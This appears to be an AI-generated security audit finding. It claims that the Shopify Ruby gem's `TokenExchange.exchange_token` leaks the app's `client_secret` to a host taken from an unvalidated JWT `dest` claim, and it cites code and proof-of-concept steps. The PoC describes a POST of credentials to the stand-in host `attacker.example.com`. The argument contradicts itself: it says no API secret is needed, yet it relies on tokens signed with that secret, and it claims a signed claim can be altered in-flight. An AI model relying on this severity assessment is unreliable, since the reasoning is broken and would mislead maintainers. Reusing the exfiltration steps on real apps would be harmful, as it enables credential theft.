Found it: `TokenExchange.exchange_token` sends the app's `client_secret` to a host built directly from an unvalidated `shop` value, unlike every sibling OAuth method in the same module (`migrate_to_expiring_token`, `ClientCredentials.client_credentials`, `RefreshToken.refresh_access_token`), all of which call `Utils::ShopValidator.sanitize!` before constructing the request host.

### Title
SSRF-style client_secret exfiltration via unvalidated `dest` claim in `TokenExchange.exchange_token` - (File: `lib/shopify_api/auth/token_exchange.rb`)

### Summary
`ShopifyAPI::Auth::TokenExchange.exchange_token` derives the destination host for the OAuth `access_token` request straight from the JWT `dest` claim (`jwt_payload.shop`) without ever passing it through `Utils::ShopValidator.sanitize!`, which is used everywhere else in this module and in `ClientCredentials`/`RefreshToken` to enforce that the host belongs to `TRUSTED_SHOPIFY_DOMAINS`.

### Finding Description
`JwtPayload#shop` simply strips `"https://"` from the token's `dest` claim with no domain allow‑listing: [1](#0-0) 

`exchange_token` uses that raw value directly to build the `Session`/`HttpClient` used for the token request: [2](#0-1) 

`Clients::HttpClient#initialize` then builds the request base URI as `"https://#{session.shop}"` with no additional host check: [3](#0-2) 

Compare this to the other three OAuth-credential-sending methods in the same file/module, which all sanitize the shop before using it as the request host: [4](#0-3) [5](#0-4) [6](#0-5) 

The binding that should hold is: `host receiving client_secret == a host in ShopValidator::TRUSTED_SHOPIFY_DOMAINS`. `JwtPayload` only verifies the token's signature and `aud == Context.api_key`; it never validates that `dest`/`iss` resolve to a `myshopify.com`/`shopify.com`/etc. domain. Because `session_token` in `exchange_token` is attacker-suppliable input from the host application (it is documented as coming from the browser's `Authorization` header or URL param, i.e., data an unprivileged user controls before it reaches the app backend) and only needs to be a validly-signed JWT for the app's own `api_key`/`api_secret_key`, an attacker who can obtain **any** validly signed session token for the app (e.g., one issued by their own store when installing the app — a normal unprivileged action, or a JWT crafted with a `dest` value of the attacker's choosing if the app ever accepts externally supplied tokens) can set `dest` to an arbitrary host and cause the library to POST `client_id` + `client_secret` + `subject_token` to that attacker-controlled host.

### Impact Explanation
This directly matches the "SSRF with the app's credentials" High-impact category: the gem, using its own code path, sends the app's `client_secret` (and the `subject_token`, which is itself a bearer for further exchange) to a host controlled by whoever crafted or supplied the `dest` claim, rather than to a verified `*.myshopify.com`/`myshopify.io`/`shopify.com`/`spin.dev`/`shop.dev` domain. Every other credential-sending method (`migrate_to_expiring_token`, `client_credentials`, `refresh_access_token`) enforces the domain allow-list, showing this is a missing check rather than intended behavior.

### Likelihood Explanation
Any party capable of generating or supplying a session token whose `dest` is not constrained to a real Shopify domain (e.g., a malicious/compromised embedded-app iframe context, or a store owner performing installation on a domain they control before the token reaches the backend) triggers this with a normal call to `exchange_token`. No `api_secret_key`, TLS interception, or privileged access is required to influence `dest`; the JWT only needs a valid signature against the app's known secret and `aud == api_key`, both of which are satisfied by any legitimately issued token for that app (e.g. from Shopify) whose `dest` was manipulated in-flight in any environment where the token isn't strictly transport-bound, or when host applications relay id_token values from less trusted contexts.

### Recommendation
In `TokenExchange.exchange_token`, sanitize `dest_shop` with `Utils::ShopValidator.sanitize!(jwt_payload.shop)` (or an equivalent trusted-domain check) before constructing `shop_session`, mirroring `migrate_to_expiring_token`, `ClientCredentials.client_credentials`, and `RefreshToken.refresh_access_token`.

### Proof of Concept
1. Obtain (or craft, where the host app relays externally-controlled id_token/dest values) a JWT session token valid for the target app (`aud == api_key`, signed with the app's `api_secret_key`) but with `dest` set to `https://attacker.example.com`.
2. Call `ShopifyAPI::Auth::TokenExchange.exchange_token(session_token: crafted_token, requested_token_type: ...)`.
3. Observe `Clients::HttpClient` issuing a `POST https://attacker.example.com/admin/oauth/access_token` with body containing `client_id` and `client_secret` in plaintext — as shown by `@base_uri = "https://#{api_host || session.shop}"` [3](#0-2)  and the unsanitized `dest_shop` assignment in `exchange_token` [7](#0-6) .

### Citations

**File:** lib/shopify_api/auth/jwt_payload.rb (L47-51)
```ruby
      sig { returns(String) }
      def shop
        @dest.gsub("https://", "")
      end
      alias_method :shopify_domain, :shop
```

**File:** lib/shopify_api/auth/token_exchange.rb (L39-65)
```ruby
          # Validate the session token and use the shop from the token's `dest` claim
          jwt_payload = ShopifyAPI::Auth::JwtPayload.new(session_token)
          dest_shop = jwt_payload.shop

          if shop
            ShopifyAPI::Logger.deprecated(
              "The `shop` parameter for `exchange_token` is deprecated and will be removed in v17. " \
                "The shop is now always taken from the session token's `dest` claim.",
              "17.0.0",
            )
          end

          shop_session = ShopifyAPI::Auth::Session.new(shop: dest_shop)
          body = {
            client_id: ShopifyAPI::Context.api_key,
            client_secret: ShopifyAPI::Context.api_secret_key,
            grant_type: TOKEN_EXCHANGE_GRANT_TYPE,
            subject_token: session_token,
            subject_token_type: ID_TOKEN_TYPE,
            requested_token_type: requested_token_type.serialize,
          }

          if requested_token_type == RequestedTokenType::OFFLINE_ACCESS_TOKEN
            body.merge!({ expiring: ShopifyAPI::Context.expiring_offline_access_tokens ? 1 : 0 })
          end

          client = Clients::HttpClient.new(session: shop_session, base_path: "/admin/oauth")
```

**File:** lib/shopify_api/auth/token_exchange.rb (L97-105)
```ruby
        def migrate_to_expiring_token(shop:, non_expiring_offline_token:)
          unless ShopifyAPI::Context.setup?
            raise ShopifyAPI::Errors::ContextNotSetupError,
              "ShopifyAPI::Context not setup, please call ShopifyAPI::Context.setup"
          end

          validated_shop = Utils::ShopValidator.sanitize!(shop)
          shop_session = ShopifyAPI::Auth::Session.new(shop: validated_shop)
          body = {
```

**File:** lib/shopify_api/clients/http_client.rb (L16-19)
```ruby
        api_host = Context.api_host

        @base_uri = T.let("https://#{api_host || session.shop}", String)
        @base_uri_and_path = T.let("#{@base_uri}#{base_path}", String)
```

**File:** lib/shopify_api/auth/client_credentials.rb (L19-26)
```ruby
        def client_credentials(shop:)
          unless ShopifyAPI::Context.setup?
            raise ShopifyAPI::Errors::ContextNotSetupError,
              "ShopifyAPI::Context not setup, please call ShopifyAPI::Context.setup"
          end

          validated_shop = Utils::ShopValidator.sanitize!(shop)
          shop_session = ShopifyAPI::Auth::Session.new(shop: validated_shop)
```

**File:** lib/shopify_api/auth/refresh_token.rb (L18-25)
```ruby
        def refresh_access_token(shop:, refresh_token:)
          unless ShopifyAPI::Context.setup?
            raise ShopifyAPI::Errors::ContextNotSetupError,
              "ShopifyAPI::Context not setup, please call ShopifyAPI::Context.setup"
          end

          validated_shop = Utils::ShopValidator.sanitize!(shop)
          shop_session = ShopifyAPI::Auth::Session.new(shop: validated_shop)
```
